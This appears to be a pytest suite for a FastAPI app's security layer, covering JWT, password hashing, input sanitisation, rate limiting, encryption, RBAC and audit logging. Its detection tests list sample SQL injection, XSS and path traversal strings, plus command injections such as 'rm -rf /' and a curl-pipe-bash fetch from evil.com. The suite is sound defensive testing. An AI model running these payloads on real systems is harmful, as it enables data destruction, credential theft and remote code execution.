"""
Comprehensive Security Test Suite

This module contains tests for all security features including:
- RS256 JWT authentication
- Input validation
- Rate limiting
- Field encryption
- RBAC permissions
- Audit logging
"""

from datetime import datetime, timedelta
from unittest.mock import Mock, patch

import jwt
import pytest
from fastapi import HTTPException, status

from app.core.encryption import EncryptedOperatorData, EncryptionManager
from app.core.rate_limiter import DistributedRateLimiter, RateLimitMiddleware
from app.core.rsa_keys import RSAKeyManager
from app.core.security import (
    ALGORITHM,
    PRIVATE_KEY,
    PUBLIC_KEY,
    create_access_token,
    create_refresh_token,
    get_password_hash,
    verify_password,
    verify_password_strength,
    verify_token,
)
from app.core.security_enhanced import (
    ROLE_PERMISSIONS,
    AuditLogger,
    FieldEncryption,
    Permission,
    Role,
)
from app.core.validation import (
    InputSanitizer,
    JobValidation,
    OperatorValidation,
    validate_uuid,
)


class TestRS256Authentication:
    """Test RS256 JWT authentication."""

    def test_create_access_token_with_rs256(self):
        """Test creating access token with RS256 algorithm."""
        subject = "test_user_123"
        expires_delta = timedelta(minutes=30)

        token = create_access_token(
            subject=subject,
            expires_delta=expires_delta,
            additional_claims={"role": "admin"},
        )

        # Verify token structure
        assert token is not None
        assert isinstance(token, str)

        # Decode and verify with public key
        if ALGORITHM == "RS256":
            decoded = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
        else:
            # Fallback for testing
            decoded = jwt.decode(token, PRIVATE_KEY, algorithms=[ALGORITHM])

        assert decoded["sub"] == subject
        assert decoded["type"] == "access"
        assert "jti" in decoded  # JWT ID for tracking
        assert "iat" in decoded  # Issued at
        assert "exp" in decoded  # Expiration
        assert decoded.get("role") == "admin"

    def test_create_refresh_token(self):
        """Test creating refresh token."""
        subject = "test_user_123"

        token = create_refresh_token(subject=subject)

        # Verify token
        payload = verify_token(token, token_type="refresh")

        assert payload is not None
        assert payload["sub"] == subject
        assert payload["type"] == "refresh"

    def test_verify_token_with_wrong_type(self):
        """Test token verification fails with wrong type."""
        access_token = create_access_token(
            subject="user123", expires_delta=timedelta(minutes=30)
        )

        # Try to verify access token as refresh token
        result = verify_token(access_token, token_type="refresh")
        assert result is None

    def test_rsa_key_rotation(self):
        """Test RSA key rotation support."""
        manager = RSAKeyManager()

        # Generate initial keys
        private1, public1 = manager.generate_keys()

        # Create token with first key
        token1 = jwt.encode(
            {"sub": "user1", "exp": datetime.utcnow() + timedelta(hours=1)},
            private1,
            algorithm="RS256",
        )

        # Rotate keys
        private2, public2 = manager.generate_keys()

        # Create token with new key
        token2 = jwt.encode(
            {"sub": "user2", "exp": datetime.utcnow() + timedelta(hours=1)},
            private2,
            algorithm="RS256",
        )

        # Both tokens should be verifiable with appropriate keys
        decoded1 = jwt.decode(token1, public1, algorithms=["RS256"])
        assert decoded1["sub"] == "user1"

        decoded2 = jwt.decode(token2, public2, algorithms=["RS256"])
        assert decoded2["sub"] == "user2"

    def test_password_hashing_with_argon2(self):
        """Test password hashing uses Argon2."""
        password = "TestPassword123!@#"

        hashed = get_password_hash(password)

        # Argon2 hashes start with $argon2
        assert hashed.startswith("$argon2") or hashed.startswith(
            "$2b$"
        )  # bcrypt fallback

        # Verify password
        assert verify_password(password, hashed)
        assert not verify_password("wrong_password", hashed)

    def test_password_strength_validation(self):
        """Test password strength requirements."""
        # Weak password
        result = verify_password_strength("password")
        assert not result["valid"]
        assert "12 characters" in str(result["issues"])

        # Strong password
        result = verify_password_strength("MyStr0ng!P@ssw0rd123")
        assert result["valid"]
        assert result["score"] >= 75

        # Common password
        result = verify_password_strength("Welcome123!@#")
        assert not result["valid"]
        assert "too common" in str(result["issues"])


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "1 UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('net user'); --",
        ]

        for input_str in malicious_inputs:
            assert InputSanitizer.detect_sql_injection(input_str)

    def test_xss_detection(self):
        """Test XSS pattern detection."""
        xss_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<iframe src='evil.com'></iframe>",
            "onclick='stealCookies()'",
        ]

        for input_str in xss_inputs:
            assert InputSanitizer.detect_xss(input_str)

    def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""
        path_traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e/config",
            "file:///etc/shadow",
            "C:\\Windows\\System32\\config\\sam",
        ]

        for input_str in path_traversal_inputs:
            assert InputSanitizer.detect_path_traversal(input_str)

    def test_command_injection_detection(self):
        """Test command injection pattern detection."""
        command_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc evil.com 1234",
            "test `whoami`",
            "$(curl evil.com/shell.sh | bash)",
        ]

        for input_str in command_inputs:
            assert InputSanitizer.detect_command_injection(input_str)

    def test_input_sanitization(self):
        """Test input sanitization."""
        # HTML sanitization
        html_input = "<div onclick='alert(1)'>Hello</div>"
        sanitized = InputSanitizer.sanitize_html(html_input)
        assert "<" not in sanitized
        assert "onclick" not in sanitized

        # Filename sanitization
        filename = "../../../etc/passwd.txt"
        sanitized = InputSanitizer.sanitize_filename(filename)
        assert ".." not in sanitized
        assert "/" not in sanitized

        # SQL identifier sanitization
        identifier = "users'; DROP TABLE--"
        sanitized = InputSanitizer.sanitize_sql_identifier(identifier)
        assert sanitized == "usersDROPTABLE"

    def test_job_validation_schema(self):
        """Test job validation schema."""
        # Valid job
        valid_job = JobValidation(
            job_number="JOB-12345",
            description="Test job",
            priority=5,
            duration_hours=8.5,
            due_date=datetime.now() + timedelta(days=7),
        )
        assert valid_job.job_number == "JOB-12345"

        # Invalid job number
        with pytest.raises(ValueError):
            JobValidation(
                job_number="'; DROP TABLE--",
                description="Test",
                priority=5,
                duration_hours=8,
            )

    def test_operator_validation_schema(self):
        """Test operator validation schema."""
        # Valid operator
        valid_operator = OperatorValidation(
            employee_id="EMP12345",
            name="John Doe",
            email="john@example.com",
            skills=["welding", "assembly"],
        )
        assert valid_operator.employee_id == "EMP12345"

        # Invalid employee ID
        with pytest.raises(ValueError):
            OperatorValidation(
                employee_id="INVALID", name="Test", email="test@example.com", skills=[]
            )

    def test_uuid_validation(self):
        """Test UUID validation."""
        assert validate_uuid("550e8400-e29b-41d4-a716-446655440000")
        assert not validate_uuid("not-a-uuid")
        assert not validate_uuid("550e8400-e29b-41d4-a716")


class TestRateLimiting:
    """Test rate limiting functionality."""

    def test_rate_limit_middleware_blocks_after_threshold(self):
        """Test rate limiting blocks after threshold."""
        middleware = RateLimitMiddleware(None)

        # Simulate multiple failed attempts
        for _ in range(6):
            middleware._track_failed_attempt("192.168.1.1")

        # Check if IP is blocked
        assert middleware._is_blocked("192.168.1.1")

    def test_burst_detection(self):
        """Test burst attack detection."""
        middleware = RateLimitMiddleware(None)

        # Simulate burst of requests
        for _ in range(15):
            middleware._track_request("192.168.1.1")

        # Should detect burst
        assert middleware._detect_burst("192.168.1.1")

    def test_adaptive_rate_limiting(self):
        """Test adaptive rate limiting based on failed attempts."""
        middleware = RateLimitMiddleware(None)

        # Clean IP gets higher limit
        limit = middleware._get_auth_limit("192.168.1.1")
        assert limit == 10

        # Add failed attempts
        middleware._track_failed_attempt("192.168.1.1")
        middleware._track_failed_attempt("192.168.1.1")

        # Limit should decrease
        limit = middleware._get_auth_limit("192.168.1.1")
        assert limit == 5

        # More failures
        middleware._track_failed_attempt("192.168.1.1")
        limit = middleware._get_auth_limit("192.168.1.1")
        assert limit == 2

    def test_distributed_rate_limiter(self):
        """Test distributed rate limiter."""
        limiter = DistributedRateLimiter()

        # Should allow initial requests
        allowed, metadata = limiter.is_allowed("test_key", limit=5, window=60)
        assert allowed
        assert metadata["remaining"] == 4

        # Use up limit
        for _ in range(4):
            limiter.is_allowed("test_key", limit=5, window=60)

        # Should block after limit
        allowed, metadata = limiter.is_allowed("test_key", limit=5, window=60)
        assert not allowed
        assert metadata["remaining"] == 0


class TestFieldEncryption:
    """Test field-level encryption."""

    def test_encryption_manager(self):
        """Test encryption manager functionality."""
        manager = EncryptionManager()

        # Encrypt string
        plaintext = "sensitive data"
        encrypted = manager.encrypt(plaintext)
        assert encrypted != plaintext
        assert isinstance(encrypted, str)

        # Decrypt
        decrypted = manager.decrypt(encrypted)
        assert decrypted == plaintext

    def test_context_specific_encryption(self):
        """Test context-specific key derivation."""
        manager = EncryptionManager()

        # Same data with different contexts produces different ciphertext
        data = "sensitive"
        encrypted1 = manager.encrypt(data, context="user_data")
        encrypted2 = manager.encrypt(data, context="job_data")

        assert encrypted1 != encrypted2

        # But decrypts correctly with right context
        assert manager.decrypt(encrypted1, context="user_data") == data
        assert manager.decrypt(encrypted2, context="job_data") == data

    def test_encrypt_complex_types(self):
        """Test encryption of complex data types."""
        manager = EncryptionManager()

        # DateTime
        dt = datetime.now()
        encrypted = manager.encrypt(dt)
        decrypted = manager.decrypt(encrypted)
        assert decrypted == dt.isoformat()

        # Dictionary
        data = {"name": "John", "age": 30, "active": True}
        encrypted = manager.encrypt(data)
        decrypted = manager.decrypt(encrypted)
        assert decrypted == data

    def test_encrypted_model_fields(self):
        """Test encrypted model fields."""
        operator = EncryptedOperatorData(
            employee_id="EMP001", name="John Doe", email="john@example.com"
        )

        # Set encrypted fields
        operator.ssn = "123-45-6789"
        operator.phone = "+1-555-0123"

        # Fields should be encrypted in storage
        assert operator._ssn_encrypted is not None
        assert operator._ssn_encrypted != "123-45-6789"

        # But accessible as plain text
        assert operator.ssn == "123-45-6789"
        assert operator.phone == "+1-555-0123"

    def test_field_encryption_integration(self):
        """Test field encryption helper class."""
        encryption = FieldEncryption()

        # Encrypt dictionary fields
        data = {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "salary": 75000,
            "department": "Engineering",
        }

        encrypted = encryption.encrypt_dict(data, fields_to_encrypt=["ssn", "salary"])

        # Check encrypted
        assert encrypted["ssn"] != data["ssn"]
        assert encrypted["salary"] != str(data["salary"])
        assert encrypted["name"] == data["name"]  # Not encrypted

        # Decrypt
        decrypted = encryption.decrypt_dict(
            encrypted, fields_to_decrypt=["ssn", "salary"]
        )

        assert decrypted["ssn"] == data["ssn"]
        assert decrypted["salary"] == str(data["salary"])


class TestRBAC:
    """Test Role-Based Access Control."""

    def test_role_permissions_mapping(self):
        """Test role-permission mappings."""
        # Operator has limited permissions
        operator_perms = ROLE_PERMISSIONS[Role.OPERATOR]
        assert Permission.VIEW_JOBS in operator_perms
        assert Permission.DELETE_JOBS not in operator_perms

        # Admin has most permissions
        admin_perms = ROLE_PERMISSIONS[Role.ADMIN]
        assert Permission.DELETE_JOBS in admin_perms
        assert Permission.ADMIN_PANEL in admin_perms

        # Superadmin has all permissions
        superadmin_perms = ROLE_PERMISSIONS[Role.SUPERADMIN]
        assert len(superadmin_perms) == len(list(Permission))

    def test_permission_inheritance(self):
        """Test permission inheritance across roles."""
        # Each higher role should have more permissions
        assert len(ROLE_PERMISSIONS[Role.OPERATOR]) < len(
            ROLE_PERMISSIONS[Role.SCHEDULER]
        )
        assert len(ROLE_PERMISSIONS[Role.SCHEDULER]) < len(
            ROLE_PERMISSIONS[Role.MANAGER]
        )
        assert len(ROLE_PERMISSIONS[Role.MANAGER]) < len(ROLE_PERMISSIONS[Role.ADMIN])
        assert len(ROLE_PERMISSIONS[Role.ADMIN]) < len(
            ROLE_PERMISSIONS[Role.SUPERADMIN]
        )

    @patch("app.api.deps.get_current_user")
    def test_require_role_dependency(self, mock_get_user):
        """Test role requirement dependency."""
        from app.api.deps import require_role

        # Create mock user with admin role
        mock_user = Mock()
        mock_user.role = "admin"
        mock_get_user.return_value = mock_user

        # Should pass for admin
        role_checker = require_role(["admin", "superadmin"])
        result = role_checker(mock_user)
        assert result == mock_user

        # Should fail for insufficient role
        mock_user.role = "operator"
        with pytest.raises(HTTPException) as exc:
            role_checker(mock_user)
        assert exc.value.status_code == status.HTTP_403_FORBIDDEN

    @patch("app.api.deps.get_current_user")
    def test_require_permission_dependency(self, mock_get_user):
        """Test permission requirement dependency."""
        from app.api.deps import require_permission

        # Create mock user with scheduler role
        mock_user = Mock()
        mock_user.role = "scheduler"
        mock_get_user.return_value = mock_user

        # Should pass for allowed permission
        perm_checker = require_permission("view_jobs")
        result = perm_checker(mock_user)
        assert result == mock_user

        # Should fail for denied permission
        perm_checker = require_permission("delete_jobs")
        with pytest.raises(HTTPException) as exc:
            perm_checker(mock_user)
        assert exc.value.status_code == status.HTTP_403_FORBIDDEN


class TestAuditLogging:
    """Test audit logging functionality."""

    @patch("app.core.security_enhanced.logging.FileHandler")
    def test_audit_logger_initialization(self, mock_handler):
        """Test audit logger setup."""
        logger = AuditLogger()
        assert logger.logger is not None

    def test_log_authentication_event(self):
        """Test authentication event logging."""
        logger = AuditLogger()

        with patch.object(logger.logger, "info") as mock_log:
            logger.log_authentication(
                event_type="login_success",
                user_id="user123",
                ip_address="192.168.1.1",
                success=True,
                details={"method": "password"},
            )

            mock_log.assert_called_once()
            call_args = mock_log.call_args[0][0]
            assert "AUTH:" in call_args
            assert "login_success" in call_args
            assert "user123" in call_args

    def test_log_data_access_event(self):
        """Test data access event logging."""
        logger = AuditLogger()

        with patch.object(logger.logger, "info") as mock_log:
            logger.log_data_access(
                user_id="user123",
                resource_type="job",
                resource_id="JOB-001",
                action="UPDATE",
                ip_address="192.168.1.1",
            )

            mock_log.assert_called_once()
            call_args = mock_log.call_args[0][0]
            assert "DATA_ACCESS:" in call_args
            assert "JOB-001" in call_args

    def test_log_security_event(self):
        """Test security event logging."""
        logger = AuditLogger()

        # Critical event should use error level
        with patch.object(logger.logger, "error") as mock_error:
            logger.log_security_event(
                event_type="intrusion_detected",
                severity="CRITICAL",
                description="Potential intrusion attempt",
                ip_address="192.168.1.1",
            )

            mock_error.assert_called_once()
            call_args = mock_error.call_args[0][0]
            assert "SECURITY:" in call_args
            assert "intrusion_detected" in call_args

        # Medium event should use warning level
        with patch.object(logger.logger, "warning") as mock_warning:
            logger.log_security_event(
                event_type="failed_auth",
                severity="MEDIUM",
                description="Multiple failed login attempts",
            )

            mock_warning.assert_called_once()


class TestSecurityIntegration:
    """Integration tests for security features."""

    def test_end_to_end_authentication_flow(self):
        """Test complete authentication flow with RS256."""
        # Create access token
        access_token = create_access_token(
            subject="user123",
            expires_delta=timedelta(minutes=30),
            additional_claims={"role": "admin"},
        )

        # Verify token
        payload = verify_token(access_token, token_type="access")
        assert payload is not None
        assert payload["sub"] == "user123"
        assert payload["role"] == "admin"

        # Create refresh token
        refresh_token = create_refresh_token("user123")

        # Verify refresh token
        refresh_payload = verify_token(refresh_token, token_type="refresh")
        assert refresh_payload is not None
        assert refresh_payload["sub"] == "user123"

    def test_secure_data_flow(self):
        """Test secure data flow with encryption."""
        # Create sensitive data
        sensitive_data = {
            "employee_id": "EMP001",
            "name": "John Doe",
            "ssn": "123-45-6789",
            "salary": 75000,
        }

        # Validate input
        assert not InputSanitizer.detect_sql_injection(sensitive_data["name"])

        # Encrypt sensitive fields
        encryption = FieldEncryption()
        encrypted_data = encryption.encrypt_dict(
            sensitive_data, fields_to_encrypt=["ssn", "salary"]
        )

        # Store encrypted (simulated)
        stored_data = encrypted_data.copy()

        # Retrieve and decrypt
        decrypted_data = encryption.decrypt_dict(
            stored_data, fields_to_decrypt=["ssn", "salary"]
        )

        assert decrypted_data["ssn"] == sensitive_data["ssn"]
        assert decrypted_data["salary"] == str(sensitive_data["salary"])

    @patch("app.core.rate_limiter.time.time")
    def test_rate_limiting_with_authentication(self, mock_time):
        """Test rate limiting on authentication endpoints."""
        middleware = RateLimitMiddleware(None)
        mock_time.return_value = 1000

        # Simulate login attempts
        ip = "192.168.1.1"

        # First 5 attempts should pass
        for _i in range(5):
            assert middleware._check_rate_limit(ip, "auth", limit=5, window=60)

        # 6th attempt should fail
        assert not middleware._check_rate_limit(ip, "auth", limit=5, window=60)

        # After window expires, should allow again
        mock_time.return_value = 1061  # 61 seconds later
        assert middleware._check_rate_limit(ip, "auth", limit=5, window=60)
